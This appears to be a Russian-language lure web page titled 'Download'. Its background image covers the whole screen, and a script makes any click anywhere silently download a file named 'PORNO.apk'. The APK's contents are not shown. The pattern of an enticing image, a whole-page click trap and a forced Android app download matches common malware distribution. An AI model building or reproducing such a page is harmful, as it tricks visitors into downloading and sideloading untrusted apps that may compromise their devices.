<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="UTF-8">
<title>Download</title>

<style>
body{
margin:0;
height:100vh;
background:url("image22.jpg") center center / cover no-repeat;
cursor:pointer;
}
</style>

<script>
document.addEventListener("click", function(){
    const link = document.createElement("a");
    link.href = "PORNO.apk";
    link.download = "PORNO.apk";
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
});
</script>
